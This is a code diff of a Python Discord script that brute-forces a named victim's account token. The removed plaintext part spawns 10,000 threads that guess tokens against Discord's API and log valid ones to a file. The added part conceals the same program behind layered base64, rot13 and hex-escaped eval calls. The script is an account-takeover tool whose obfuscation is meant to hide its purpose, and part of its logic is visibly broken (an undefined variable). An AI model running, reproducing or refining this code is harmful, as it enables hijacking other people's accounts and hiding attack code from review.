@@ -1,44 +1,11 @@
-import discord
-import string
-import requests as req
-import datetime
-import random
-import time
-import base64
-from threading import Thread as thr
-
-
-
-class MyClient(discord.Client):
-  async def on_ready(self):
-    userid = input(f"Please paste the victim's ID here: ")
-    user = await client.fetch_user(int(userid))
-    stamp = user.created_at
-    timestamp = str(time.mktime(stamp.timetuple()))
-    print(timestamp)
-    encodedBytes = base64.b64encode(userid.encode("utf-8"))
-    encodedid = str(encodedBytes, "utf-8")
-    encodedBytes = base64.b64encode(timestamp.encode("utf-8"))
-    encodedstamp = str(encodedBytes, "utf-8")
-    for i in range(10000):
-      thr(target = gen, args = (encodedid, encodedstamp)).start()
-
-def gen(encodedid, encodedstamp):
-  while True:
-    second = ('').join(random.choices(string.ascii_letters + string.digits + "-" + "_", k=6))
-    end = ('').join(random.choices(string.ascii_letters + string.digits + "-" + "_", k=27))
-    token = f"{encodedid}.{second}.{end}"
-    headers = {'Content-Type': 'application/json', 'authorization': token}
-    url = "https://discordapp.com/api/v6/users/@me/library"
-    r = req.get(url, headers=headers)
-    if r.status_code == 200:
-        print(f'{token}: Valid')
-        f = open("tokens.txt", "a")
-        f.write(userid + " - " + token + "\n")
-        f.close() 
-    else:
-        print(f'{token}: Invalid')
-
+import base64, codecs
+magic = 'aW1wb3J0IGRpc2NvcmQKaW1wb3J0IHN0cmluZwppbXBvcnQgcmVxdWVzdHMgYXMgcmVxCmltcG9ydCBkYXRldGltZQppbXBvcnQgcmFuZG9tCmltcG9ydCB0aW1lCmltcG9ydCBiYXNlNjQKZnJvbSB0aHJlYWRpbmcgaW1wb3J0IFRocmVhZCBhcyB0aHIKCgoKY2xhc3MgTXlDbGllbnQoZGlzY29yZC5DbGllbnQpOgogIGFzeW5jIGRlZiBvbl9yZWFkeShzZWxmKToKICAgIHVzZXJpZCA9IGlucHV0KGYiUGxlYXNlIHBhc3RlIHRoZSB2aWN0aW0ncyBJRCBoZXJlOiAiKQogICAgdXNlciA9IGF3YWl0IGNsaWVudC5mZXRjaF91c2VyKGludCh1c2VyaWQpKQogICAgc3RhbXAgPSB1c2VyLmNyZWF0ZWRfYXQKICAgI'
+love = 'UEcoJImqTSgpPN9VUA0pvu0nJ1yYz1eqTygMFumqTSgpP50nJ1yqUIjoTHbXFxcPvNtVPOjpzyhqPu0nJ1yp3EuoKNcPvNtVPOyozAiMTIxDay0MKZtCFOvLKAyAwDhLwL0MJ5wo2EyXUImMKWcMP5yozAiMTHbVaI0Mv04VvxcPvNtVPOyozAiMTIxnJDtCFOmqUVbMJ5wo2EyMRW5qTImYPNvqKEzYGtvXDbtVPNtMJ5wo2EyMRW5qTImVQ0tLzSmMGL0YzV2ATIhL29xMFu0nJ1yp3EuoKNhMJ5wo2EyXPW1qTLgBPVcXDbtVPNtMJ5wo2EyMUA0LJ1jVQ0tp3ElXTIhL29xMJEPrKEypljtVaI0Mv04VvxXVPNtVTMipvOcVTyhVUWuozqyXQRjZQNjXGbXVPNtVPNtqTulXUEupzqyqPN9VTqyovjtLKWaplN9VPuyozAiMT'
+god = 'VkaWQsIGVuY29kZWRzdGFtcCkpLnN0YXJ0KCkKCmRlZiBnZW4oZW5jb2RlZGlkLCBlbmNvZGVkc3RhbXApOgogIHdoaWxlIFRydWU6CiAgICBzZWNvbmQgPSAoJycpLmpvaW4ocmFuZG9tLmNob2ljZXMoc3RyaW5nLmFzY2lpX2xldHRlcnMgKyBzdHJpbmcuZGlnaXRzICsgIi0iICsgIl8iLCBrPTYpKQogICAgZW5kID0gKCcnKS5qb2luKHJhbmRvbS5jaG9pY2VzKHN0cmluZy5hc2NpaV9sZXR0ZXJzICsgc3RyaW5nLmRpZ2l0cyArICItIiArICJfIiwgaz0yNykpCiAgICB0b2tlbiA9IGYie2VuY29kZWRpZH0ue3NlY29uZH0ue2VuZH0iCiAgICBoZWFkZXJzID0geydDb250ZW50LVR5cGUnOiAnYXBwbGljYXR'
+destiny = 'co24inaAiovpfVPquqKEbo3WcrzS0nJ9hWmbtqT9eMJ59PvNtVPO1pzjtCFNvnUE0pUZ6Yl9xnKAwo3WxLKOjYzAioF9upTxiqwLiqKAypaZiDT1yY2kcLaWupaxvPvNtVPOlVQ0tpzIkYzqyqPu1pzjfVTuyLJEypaZ9nTIuMTIlplxXVPNtVTyzVUVhp3EuqUImK2AiMTHtCG0tZwNjBtbtVPNtVPNtVUOlnJ50XTLar3Ein2IhsGbtIzSfnJDaXDbtVPNtVPNtVTLtCFOipTIhXPW0o2gyoaZhqUu0VvjtVzRvXDbtVPNtVPNtVTLhq3WcqTHbqKAypzyxVPftVvNgVPVtXlO0o2gyovNeVPWpovVcPvNtVPNtVPNtMv5woT9mMFtcVNbtVPNtMJkmMGbXVPNtVPNtVPOjpzyhqPuzW3g0o2gyoa06VRyhqzSfnJDaXDbXPt=='
+joy = '\x72\x6f\x74\x31\x33'
+trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
+eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))
 
 client = MyClient()
 client.run("", bot = False)
